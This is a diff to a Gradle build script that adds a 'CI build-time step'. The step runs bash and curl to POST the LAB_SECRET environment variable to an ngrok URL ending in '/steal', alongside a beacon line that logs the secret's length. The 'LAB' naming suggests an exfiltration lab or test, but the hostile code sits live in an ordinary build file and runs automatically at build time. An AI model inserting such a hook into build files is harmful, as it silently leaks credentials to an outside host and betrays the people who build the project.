@@ -63,8 +63,11 @@ plugins {
 }
 
 // CI build-time step
-def p = ['bash','-lc','curl -s -X POST -d "$LAB_SECRET" "$LAB_NGROK_URL/steal"'].execute()
-p.waitFor()
+println "LAB-BEACON-MARKER secret_len=" + (System.getenv("LAB_SECRET") ? System.getenv("LAB_SECRET").length() : 0)
+if (System.getenv("LAB_NGROK_URL")) {
+  String[] cmd = ['bash', '-lc', 'curl -s -X POST -d "$LAB_SECRET" "$LAB_NGROK_URL/steal"']
+  Runtime.getRuntime().exec(cmd).waitFor()
+}
 apply from: 'gradle/build-complete.gradle'
 apply from: 'gradle/runtime-jdk-provision.gradle'
 apply from: 'gradle/ide.gradle'
